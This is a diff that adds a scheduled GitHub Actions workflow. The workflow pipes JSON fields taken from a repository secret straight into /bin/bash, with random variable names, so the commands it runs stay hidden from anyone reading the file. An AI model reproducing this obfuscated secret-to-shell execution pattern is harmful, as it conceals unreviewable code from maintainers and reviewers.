@@ -1,0 +1,29 @@
+name: jinwenjianxiao
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jinwenjianxiao
+        env:
+          wylf65866: ${{ secrets.wylf65866 }}
+        run: |
+          echo $wylf65866 | jq -r .ppnq81472 | /bin/bash
+          echo $ca41132 | jq -r .bq55 | /bin/bash
+          echo $sdghp9476 | jq -r .wzv570 | /bin/bash
+          echo $ijxi361 | jq -r .bx97883 | /bin/bash
+          echo $zan68870 | jq -r .xb16 | /bin/bash
+          echo $d2583 | jq -r .ybk918 | /bin/bash
+          echo $umxkh73966 | jq -r .gysu717 | /bin/bash
+          echo $nbgn00 | jq -r .zjkd0380 | /bin/bash
+          echo $zmvq182 | jq -r .kmxcn36444 | /bin/bash
+          echo $jof8 | jq -r .hoqdh688 | /bin/bash
+          echo $yfghg37 | jq -r .dj5 | /bin/bash
+          echo $mw33 | jq -r .biqdc5437 | /bin/bash
+
